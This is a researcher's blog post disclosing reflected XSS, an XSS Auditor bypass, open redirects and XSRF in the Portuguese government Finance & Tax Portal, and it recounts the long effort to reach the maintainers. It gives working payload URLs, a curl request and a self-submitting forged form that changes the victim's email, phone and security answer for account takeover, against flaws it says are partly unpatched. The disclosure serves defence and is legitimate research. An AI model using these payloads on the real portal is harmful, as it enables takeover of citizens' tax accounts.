---
layout: post
title: "Deeply Vulnerable Legacy Code - Portuguese Government Finance & Tax Portal"
description: "Part 1/2 - Multiple Reflected XSS, Open Redirects, XSRF"
thumb_image: "finance-tax-portal-1/main.png"
tags: [security, disclosure, web]
---

> **Part 1/2** of the [Portuguese Finance & Tax Portal](https://www.portaldasfinancas.gov.pt) security disclosure.
>
> **Summary**: Virtue of having a bundle of legacy, unmaintainable systems, this crucial web portal is susceptible to various classes of web application attacks. These allow for complete account takeover with minimal user interaction.

In this initial article I'll work through the vulnerabilities I've discovered in the [Portuguese Finance & Tax Portal](https://www.portaldasfinancas.gov.pt) which don't involve direct access to [personally identifiable information (PII)](https://en.wikipedia.org/wiki/Personally_identifiable_information).

By combining some of these vulnerabilities it is possible to **secure access to the account of any Portuguese citizen or entity with limited user interaction**.

{% include image.html path="finance-tax-portal-1/main.png"
   alt="Main portal page." caption-no="1" caption="Main portal page."
%}


## Publishing Unpatched Vulnerabilities

These last 8 months saw the web portal receive several security fixes, including those addressing the most serious vulnerabilities (to be reviewed in the second part of this disclosure). However, some of these are yet to be patched and can still be observed in the wild.

The reason as to why this is the case is simple - **a diverse set of legacy code not written from the ground up to be secure** ends up generating an absurd amount of technical debt. This is lamentable and arguably out of the control of maintainers with whom I've been able to talk to.

This, allied to the fact that **most if not all the flaws are not only incredibly easy to find** but also classic textbook cases straight out of [OWASP's WebGoat](https://github.com/WebGoat/WebGoat), led me to publish some unpatched vulnerabilities.


### General Considerations & Analysis Scope

Unlike some disclosures, **this isn't a comprehensive analysis**. When I spot a vulnerability with a specific impact, I don't continue probing for all endpoints that allow such an attack to take place, but only those that pave the path for more interesting ones.

Having said that, I believe a well-designed web application, especially one processing and storing sensitive data, should make use of certain technologies like:

* A modern version of [TLS](https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security) (used for HTTPS);
* [HTTP Strict Transport Security (HSTS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security);
* A secure [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

I will ignore these, however, as I consider that would, unfortunately, be setting the bar too high. Since the second part of this series contains critical vulnerabilities that don't require brute-forcing, I will also not discuss this type of attack.


### Reporting Security Flaws via the Support Line

The first thing I do whenever I identify a security flaw is to try to find the dedicated email of the affected entity's security team. If it is nowhere to be found, a blank message is sent to `security@domain.tld`. Traditionally, that ends up getting bounced. I don't entirely condemn them for not following [RFC 2142](https://tools.ietf.org/html/rfc2142#section-4) as these mailboxes do get blasted with spam and unwanted messages.

But without a responsive means of communication, trying to reach the right person quickly turns into a nightmare. But such is no match for **when you are sucked into the world of unprioritized, crippled, slow and low-level support**.

And I went through that... [again]({{ '/posts/harder-to-report-than-to-find-security-vulnerabilities-portuguese-government' | relative_url }}). First, I called the support line multiple times asking to report a serious vulnerability. Sadly, these technicians are trained into just instructing citizens to submit a support ticket, regardless of the subject at hand. I submitted one. I called multiple times. After 4 months, and as requested, I created another one. Both are still open to this day.

It got to the point where I was forced to **file a complaint** with the my country's [Data Protection Authority (DPA)](https://en.wikipedia.org/wiki/National_data_protection_authority). Not that it made any difference - my calls and emails kept piling up. Even after explaining in layman's terms the severity of the situation (and precisely what was impacted), all I got was that they had, and I quote:

> Too many complaints (...) [and that it would] likely take another several months for an investigation to even begin.

Finally, I called *Autoridade Tributária* (AT) one last time. **36 minutes and 49 seconds** - more than half an hour between call forwards, multiple departments and my refusal to open yet another useless ticket. Finally someone listened and forwarded my call to that one person - the one that could fix the issue.

And here we are.


### Reflected XSS (POST)

We'll open with a solid, old [Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) vulnerability. I won't go into many details regarding this endpoint, as we'll come to it later on. The following triggers it:

``` shell
curl -X POST \
  https://www.portaldasfinancas.gov.pt/pt/fiabilizacaoTelefone.action \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'cookie: portalfin_JSessionID=VALID_SESSION;SINGLE_DOMAIN_SSO_COOKIE=VALID_SSO;' \
  -d 'telefone="><img src=/ onerror=alert(1)>&codigo=CODE&confirmarBtn=Confirmar'
```

Only the `telefone` key is injectable and the user must be logged-in. There is a similar endpoint that deals with an email address which, unlike this one, properly escapes the input.

As you may have guessed, Chromium XSS Auditor blocks this, making it the least interesting XSS vector.


### Reflected XSS (GET)

Apart from exoteric conditions, reflected XSS vulnerabilities usually require user interaction, something that an attacker should ideally focus on minimizing. On most conditions, if the request is carried out through the HTTP GET method, one can simply send a URL with the payload, piggyback on the fact the domain is legitimate and hope the browser doesn't interfere with the injected code.

This is the case among several pages, one of them being a navigation page that outputs an error message when one of its query parameters is invalid:

`https://www.portaldasfinancas.gov.pt/pt/main.jsp?body=/external/sfi/presentation.view&queryStringS=targetScreen`

{% include image.html path="finance-tax-portal-1/xss-get-error.png"
   alt="Error dialog due to invalid parameter." caption-no="2" caption="Error dialog due to invalid parameter."
%}

The red error box HTML code is:

``` html
<div class="redBoxBody">
  <strong>
    ERRO: Parametro Hash Message Authentication Code(HMAC) encontra-se duplicado ou é o primeiro parâmetro da QueryString.targetScreen
  </strong>
</div>
```

The parameter `queryStringS` with value `targetScreen` is echoed without being filtered, opening up another XSS vulnerability.

But the exciting matter about this particular endpoint is how it **redirects to the login page if the user is not authenticated and then redirects back to the exploit once they are**. This is invaluable for phishing scams and any kind of attack that requires an authenticated user.

Another vulnerable page is the classic search page:

`https://www.portaldasfinancas.gov.pt/geral/search?query='';!--"<XSS>=&{()}`

The interesting bit about this URL is how they seemingly tried to prevent XSS by escaping the search box. In fact, if the search doesn't return any results, no XSS is possible:

{% include image.html path="finance-tax-portal-1/xss-get-search-no-results.png"
   alt="Search page with no results." caption-no="3" caption="Search page with no results."
%}

``` html
<h3>Resultados da Pesquisa</h3>
<p>
  Não foram encontrados resultados para as palavras de pesquisa
  <span class="highlight">'';!--"&lt;XSS&gt;=</span> no Portal das Finanças.
</p>
<input type="hidden" name="lastquery" id="lastquery"
       value="&#x27;&#x27;;!--&quot;&lt;XSS&gt;="
/>
```

But when results are displayed, we get a reminder of why **XSS protection shouldn't be done manually - you'll forget it somewhere**. The following is echoed for each search result when we use, for example:

`https://www.portaldasfinancas.gov.pt/geral/search?query=valid"><img src=/ onerror=alert(1)>`

{% include image.html path="finance-tax-portal-1/xss-get-auditor-blocked.png"
   alt="Injected code blocked by the XSS Auditor." caption-no="4" caption="Injected code blocked by the XSS Auditor."
%}

``` html
<li>
  <a class="search-item-last-link"
     href="/geral/search/click?
       PageInfo=SOME_ID
       &BlockType=0
       &ClickedItemId=SOME_ID_2
       &SourceId=SOME_ID_3
       &OriginalSearchQuery=valid"><img src=/ onerror=alert(1)>
       &ClickedResultTitle=SOME_TEXT
       &ClickedResultPath=https://info-aduaneiro.portaldasfinancas.gov.pt/pt/informacao_aduaneira/sds/docs_via_aerea/Documents/SOME_TEXT_2-SOME_TEXT.pdf"
     title="SOME_TEXT_2-SOME_TEXT"
  >
    SOME_TEXT_2-SOME_TEXT
  </a>
</li>
```

As you can see, the `OriginalSearchQuery` key includes our payload unescaped. The only thing we need to ensure is that the search returns results, hence why `valid` is included in the beginning (most simple strings will pass the search query).

For some reason requests with `<script>alert(1)</script>` or similar are blocked. I hope that isn't due to a [Web Application Firewall (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall) as that would be a pretty poor WAF.

But this is all still **thwarted by that annoying XSS auditor**.


### Open Redirect

Before we get to the final class of XSS vulnerabilities, let's take a good look at the previous HTML code. You may notice this:

``` html
ClickedResultPath=https://info-aduaneiro.portaldasfinancas.gov.pt/pt/informacao_aduaneira/sds/docs_via_aerea/Documents/SOME_TEXT_2-SOME_TEXT.pdf
```

Applications must whitelist redirect paths in order to prevent open redirect vulnerabilities, something that wasn't done here. The following URL redirects the user to my website (I've removed the other parameters):

`https://www.portaldasfinancas.gov.pt/geral/search/click?ClickedResultPath=https://migueldemoura.com`

Another open redirect can be found on the logout endpoint:

`https://www.portaldasfinancas.gov.pt/pt/logoutSA.action?redirectTo=https://migueldemoura.com`

Like many of these weaknesses, they affect both [www.portalfinancas.com](https://www.portalfinancas.com) and [sitfiscal.portalfinancas.com](https://sitfiscal.portalfinancas.com).


### Reflected XSS (GET) - Chromium XSS Auditor Bypass

Back to XSS; In the following case, and unlike all others, we also manage to bypass the Chromium XSS Auditor by injecting our code into an inline script:

``` html
https://sitfiscal.portaldasfinancas.gov.pt/geral/home?segmento=', '');alert(1);//
https://www.portaldasfinancas.gov.pt/geral/home?segmento=', '');alert(1);//
https://sitfiscal.portaldasfinancas.gov.pt/geral/home?areaDestino=', '');alert(1);//
https://www.portaldasfinancas.gov.pt/geral/home?areaDestino=', '');alert(1);//
```

{% include image.html path="finance-tax-portal-1/xss-get-auditor-bypass.png"
   alt="Injected code running - XSS Auditor Bypass." caption-no="5" caption="Injected code running - XSS Auditor Bypass."
%}

``` html
<script type="text/javascript">
  $(function () {
    alertas.init('<label>||ALERTA_TITULO||</label><p class="red-excerpt">||ALERTA_DESCRICAO||</p>', '<label>||ALERTA_TITULO||</label><p>||ALERTA_DESCRICAO||</p>', 'INJECTION', '');
  });
</script>
```

Our payload simply escapes the function and ensures it has the correct number of arguments:

``` html
<script type="text/javascript">
  $(function () {
    alertas.init('<label>||ALERTA_TITULO||</label><p class="red-excerpt">||ALERTA_DESCRICAO||</p>', '<label>||ALERTA_TITULO||</label><p>||ALERTA_DESCRICAO||</p>', '', '');alert(1);//', '');
  });
</script>
```

Since this is injected on multiple locations, we can prevent the exploit from executing more than once with the following string: `', '');if(!window.p){window.p=1; alert(1);}//`.

The four URLs pertain to the search functionality of two sections, both available without authentication.


### XSRF

With XSS out of the way, let's hop into another X-vulnerability - [Cross-Site Request Forgery (XSRF)](https://developer.mozilla.org/en-US/docs/Glossary/CSRF).

Since not a single one of the endpoints has XSRF protection, it is **trivial to take over an account if the user is both logged in at the portal and clicks a malicious link**.

One issue with XSRF attacks is that you may not be able to fully identify which account you've successfully attacked. This is not the case here as the tax identification number (NIF) is delivered along with the account data change message.

{% include image.html path="finance-tax-portal-1/xsrf-email-message.png"
   alt="Email received by the attacker with the victim's full name and NIF." caption-no="6" caption="Email received by the attacker with the victim's full name and NIF."
%}

Some information that can be modified through the personal area:

* `Email`
* `Phone Number`
* `Security Question`

{% include image.html path="finance-tax-portal-1/personal-area.png"
   alt="Personal area page." caption-no="7" caption="Personal area page."
%}

To make matters worse, the page doesn't have the [X-Frame-Options (XFO)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options) header or the equivalent CSP directive [frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), meaning the **victim would be completely oblivious to the attack**.

In order to change either of these, an attacker would only need to use a short HTML snippet like:

``` html
<html>
  <form name="exploit" action="https://www.portaldasfinancas.gov.pt/pt/alterarDadosPessoais.action" method="POST">
    <input name="novoNumero" value="true">
    <input name="novoEmail" value="true">
    <input name="pergunta" value="1">
    <input name="resposta" value="attacker">
    <input name="email" value="attacker@example.com">
    <input name="telefone" value="901234567">
    <input name="confirmarBtn" type="submit" value="Confirmar">
  </form>
  <script>
    document.exploit.submit();
  </script>
</html>
```

After requesting the changes, it would also be necessary to send one additional request to confirm the new email and another for the phone number. These endpoints are also vulnerable and could be exploited the same way:

`https://www.portaldasfinancas.gov.pt`
* `/pt/fiabilizacaoEmail.action`
* `/pt/fiabilizacaoTelefone.action`

A more sophisticated attacker would chain most of the vulnerabilities described, easily achieving near frictionless phishing attacks.

But no matter how little interaction is needed, the user always has a chance.

That's where [part 2]({{ '/posts/breaking-into-the-finance-government-account-of-every-portuguese-citizen-entity' | relative_url }}) comes in.


### Timeline

| Date                    | Activity
|-------------------------|------------------------------------------------------------------------------
| 2018-01-14              | Contacted the support line.
| 2018-01-15              | Contacted the support line. Opened a new ticket.
| 2018-01-15              | Contacted the Portuguese Data Protection Authority.
| 2018-03-04              | Filled a complaint to the Portuguese Data Protection Authority.
| 2018-04-27              | Contacted the support line again. Opened another ticket.
| 2018-05-07 - 2018-05-14 | NIF + Phone Number Enumeration & Security Question Bypass vulnerability is fixed.
| 2018-05-14              | Contacted the support line again. Provided full details to `asi@at.gov.pt`.
| 2018-05-17              | Re-sent details email as my SMTP server silently dropped it due to `at.gov.pt`'s lack of TLS support.
| 2018-06-04              | Arbitrary Account Takeover via NIF vulnerability is fixed.
| 2018-06-04 - 2018-06-26 | Several other vulnerabilities are fixed.
| 2018-08-15              | Public disclosure (Part 1/2).
